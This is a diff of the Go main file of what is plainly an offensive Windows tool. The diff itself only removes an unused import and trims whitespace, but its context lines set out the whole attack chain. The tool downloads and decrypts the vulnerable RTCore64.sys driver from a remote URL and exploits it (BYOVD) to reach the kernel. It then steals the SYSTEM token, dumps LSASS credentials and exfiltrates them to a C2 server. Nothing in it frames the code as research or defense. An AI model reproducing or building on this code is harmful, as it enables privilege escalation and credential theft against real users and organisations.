@@ -3,7 +3,6 @@ package main
 import (
 	"flag"
 	"fmt"
-	"log"
 	"os"
 	"path/filepath"
 	"runtime"
@@ -50,19 +49,19 @@ func main() {
 
 	// **PHASE 1: SOPHISTICATED DRIVER ACQUISITION & DEPLOYMENT**
 	logger.Info("Phase 1: Acquiring and deploying RTCore64 driver")
-	
+
 	driverPath := filepath.Join(".", "RTCore64.sys")
-	
+
 	// Check if driver exists, if not download and decrypt
 	if _, err := os.Stat(driverPath); os.IsNotExist(err) {
 		logger.Info("Driver not found locally, attempting download and decryption")
-		
+
 		// Download and decrypt driver from remote location
 		err = crypto.DownloadAndDecryptDriver(cfg.DriverURL, driverPath)
 		if err != nil {
 			logger.Fatal("Failed to download and decrypt driver: %v", err)
 		}
-		
+
 		logger.Info("Driver successfully downloaded and decrypted")
 	} else {
 		logger.Info("Using existing RTCore64.sys driver")
@@ -74,7 +73,7 @@ func main() {
 	if err != nil {
 		logger.Fatal("Failed to deploy driver service: %v", err)
 	}
-	
+
 	defer func() {
 		logger.Info("Cleaning up driver service")
 		service.StopDriverService()
@@ -82,7 +81,7 @@ func main() {
 
 	// **PHASE 2: ENHANCED BYOVD INITIALIZATION**
 	logger.Info("Phase 2: Initializing enhanced BYOVD exploitation")
-	
+
 	// Initialize enhanced RTCore exploit
 	exploit, err := byovd.NewRTCoreEnhancedExploit()
 	if err != nil {
@@ -97,45 +96,45 @@ func main() {
 	if err != nil {
 		logger.Fatal("Failed to get ntoskrnl base address: %v", err)
 	}
-	
+
 	logger.Info("Ntoskrnl base address: 0x%x", ntoskrnlBase)
 
 	// **PHASE 3: SOPHISTICATED TOKEN MANIPULATION**
 	logger.Info("Phase 3: Performing sophisticated token manipulation")
-	
+
 	// Initialize sophisticated token stealer
 	tokenStealer := privesc.NewSophisticatedTokenStealer(exploit)
-	
+
 	// Discover SYSTEM process and extract tokens
 	err = tokenStealer.DiscoverSystemProcess()
 	if err != nil {
 		logger.Fatal("Failed to discover SYSTEM process: %v", err)
 	}
-	
+
 	logger.Info("SYSTEM process discovered successfully")
-	
+
 	// Discover dynamic offsets for token manipulation
 	err = tokenStealer.DiscoverOffsets()
 	if err != nil {
 		logger.Fatal("Failed to discover token offsets: %v", err)
 	}
-	
+
 	logger.Info("Dynamic offsets discovered successfully")
-	
+
 	// Perform sophisticated token stealing
 	err = tokenStealer.StealSystemToken()
 	if err != nil {
 		logger.Fatal("Failed to steal SYSTEM token: %v", err)
 	}
-	
+
 	logger.Info("SYSTEM token stolen and applied successfully")
 
 	// **PHASE 4: ENHANCED LSASS CREDENTIAL EXTRACTION**
 	logger.Info("Phase 4: Enhanced LSASS credential extraction with elevated privileges")
-	
+
 	// Initialize enhanced LSASS dumper with new privileges
 	dumper := lsass.NewSwiperTheStealer()
-	
+
 	// Extract credentials using enhanced methods
 	credentials, err := dumper.ExtractCredentials()
 	if err != nil {
@@ -147,7 +146,7 @@ func main() {
 	// **PHASE 5: C2 COMMUNICATION**
 	if cfg.C2Server != "" {
 		logger.Info("Phase 5: Establishing C2 communication")
-		
+
 		client := c2client.NewClient(cfg.C2Server)
 		err = client.ExfiltrateCredentials(credentials)
 		if err != nil {
